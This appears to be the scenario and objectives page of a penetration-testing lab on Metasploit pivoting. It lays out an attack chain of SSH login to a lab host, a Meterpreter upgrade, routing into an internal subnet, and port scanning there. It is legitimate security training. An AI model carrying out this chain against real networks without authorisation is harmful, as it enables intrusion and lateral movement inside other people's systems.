### Scenario

**Metasploit Pivoting & Internal Network Routing** allows penetration testers to leverage a dual-homed compromised host as a springboard, routing attack traffic into isolated internal subnets that are unreachable directly from the external network.

Key technical concepts in Metasploit pivoting:
1. **Initial Compromise & Session Upgrade**: Gaining SSH shell access on dual-homed host <font color="#38bdf8"><b>192.168.0.19</b></font> via <font color="#c084fc"><b>auxiliary/scanner/ssh/ssh_login</b></font> and upgrading to Meterpreter via <font color="#ffd700"><b>sessions -u 1</b></font>.
2. **Interface Discovery**: Running <font color="#ffd700"><b>ipconfig</b></font> or <font color="#ffd700"><b>ifconfig</b></font> inside Meterpreter to identify dual network interfaces connecting `192.168.0.0/24` (external) and `10.1.1.0/24` (internal pivot subnet).
3. **Internal Routing Methods**:
   - **Method 1 (Manual Routing)**: Backgrounding session and executing <font color="#ffd700"><b>route add 10.1.1.0/24 2</b></font> to route traffic destined for `10.1.1.0/24` through Meterpreter session ID `2`.
   - **Method 2 (Autoroute Post Module)**: Using <font color="#c084fc"><b>post/multi/manage/autoroute</b></font> with `set session 2` and `set SUBNET 10.1.1.0/24` to automatically populate Metasploit routing tables.
4. **Internal Subnet Port Scanning**: Executing <font color="#c084fc"><b>auxiliary/scanner/portscan/tcp</b></font> over the pivoted route against <font color="#38bdf8"><b>10.1.1.0/24</b></font> to discover open ports on internal hosts (<font color="#38bdf8"><b>10.1.1.24</b></font> Wordpress server).

In this exercise, we log into **Parrot Security** (<font color="#c084fc"><b>pentester</b></font> / <font color="#ff4d4d"><b>toor</b></font>), start PostgreSQL and MSFConsole, exploit SSH on Ubuntu host <font color="#38bdf8"><b>192.168.0.19</b></font> (<font color="#c084fc"><b>ubuntu</b></font> / <font color="#ff4d4d"><b>toor</b></font>), upgrade session 1 to Meterpreter (session 2), discover internal interface `10.1.1.0/24`, configure internal routes manually and via `autoroute`, perform TCP port scanning on `10.1.1.0/24`, and identify <font color="#38bdf8"><b>1</b></font> open port on internal target host <font color="#38bdf8"><b>10.1.1.24</b></font>.

### Objective

The objective of this lab is to help students learn how to:
- Authenticate to Parrot Security target VM (<font color="#c084fc"><b>pentester</b></font> / <font color="#ff4d4d"><b>toor</b></font>)
- Launch PostgreSQL service and Metasploit Framework: <font color="#ffd700"><b>service postgresql start && msfconsole</b></font>
- Search and load SSH login scanner module: <font color="#ffd700"><b>use auxiliary/scanner/ssh/ssh_login</b></font>
- Configure target host parameters: <font color="#ffd700"><b>set RHOST 192.168.0.19</b></font>, <font color="#ffd700"><b>set USERNAME ubuntu</b></font>, <font color="#ffd700"><b>set PASSWORD toor</b></font>
- Upgrade standard shell session 1 to Meterpreter: <font color="#ffd700"><b>sessions -u 1</b></font>
- Interact with Meterpreter session 2: <font color="#ffd700"><b>sessions -i 2</b></font> and inspect network interfaces (<font color="#ffd700"><b>ipconfig</b></font>)
- Configure manual pivoting route: <font color="#ffd700"><b>route add 10.1.1.0/24 2</b></font>
- Execute internal TCP port scan over pivot route: <font color="#c084fc"><b>auxiliary/scanner/portscan/tcp</b></font>
- Configure automated pivoting route using Autoroute module: <font color="#c084fc"><b>post/multi/manage/autoroute</b></font>
- Verify open ports on internal pivot host <font color="#38bdf8"><b>10.1.1.24</b></font> (<font color="#38bdf8"><b>1</b></font> open port)
